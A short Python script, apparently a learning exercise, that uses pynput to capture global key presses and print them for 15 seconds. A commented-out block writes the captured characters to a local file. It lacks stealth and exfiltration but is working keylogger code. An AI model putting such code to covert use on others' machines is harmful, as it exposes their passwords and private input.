from pynput import keyboard

# def keyPressed(key):
#     print("hello")
#     print(str(key))
#     with open("./keyfile.txt", 'a') as logKey:
#         try:
#             char = key.char
#             logKey.write(char)
#         except:
#             print("Error getting char")
    

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyPressed)
#     listener.start()
#     input()

import time

class Keylogger:
    def __init__(self):
        self.key = ""
        self.listener = None
    
    def start(self):
        self.listener = keyboard.Listener(on_press=self.log)
        self.listener.start()
        print("listener started....")

    def log(self, key):
        print(key)

    def stop(self):
        print("listener stopped....")
        self.listener.stop()
        self.listener = None


keylogger = Keylogger()
keylogger.start()
time.sleep(15)
keylogger.stop()

